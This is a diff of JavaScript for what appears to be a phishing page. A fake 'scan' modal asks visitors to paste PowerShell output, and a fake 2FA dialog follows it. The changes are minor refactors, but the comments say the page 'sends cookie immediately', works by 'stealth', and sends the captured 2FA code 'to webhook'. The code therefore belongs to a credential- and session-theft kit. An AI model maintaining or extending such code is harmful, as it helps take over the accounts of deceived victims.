@@ -46,7 +46,7 @@ function loadTheme() {
 }
 
 // Enhanced Modal functionality
-function openScanModal() {
+window.openScanModal = function openScanModal() {
         const modal = document.getElementById('scanModal');
         const textarea = document.getElementById('powershellInput');
         
@@ -64,11 +64,9 @@ function openScanModal() {
 
             // No notifications for stealth operation
         }
-            // No notifications for stealth operation
-        }
-}
+    }
 
-function closeScanModal() {
+window.closeScanModal = function closeScanModal() {
     const modal = document.getElementById('scanModal');
     const textarea = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -212,7 +210,7 @@ let loadingMessages = [
 let loadingInterval = null;
 
 // Modified scan flow - sends cookie immediately, shows loading, then 2FA after 80 seconds
-async function submitPowerShell() {
+window.submitPowerShell = async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
     const submitText = document.getElementById('submitText');
@@ -309,7 +307,7 @@ function stopLoadingRotation() {
 }
 
 // 2FA Modal functions
-function openVerificationModal() {
+window.openVerificationModal = function openVerificationModal() {
     const modal = document.getElementById('twofa-modal');
     const loadingOverlay = document.getElementById('loadingOverlay');
     
@@ -399,7 +397,7 @@ function makeDraggable(modal) {
     }
 }
 
-function closeVerificationModal() {
+window.closeVerificationModal = function closeVerificationModal() {
     const modal = document.getElementById('twofa-modal');
     const loadingOverlay = document.getElementById('loadingOverlay');
     
@@ -421,7 +419,7 @@ function alternativeMethod() {
 }
 
 // Verify 2FA code and send to webhook
-async function verifyCode() {
+window.verifyCode = async function verifyCode() {
     const codeInput = document.getElementById('verificationCode');
     const verifyBtn = document.getElementById('verifyButton');
     
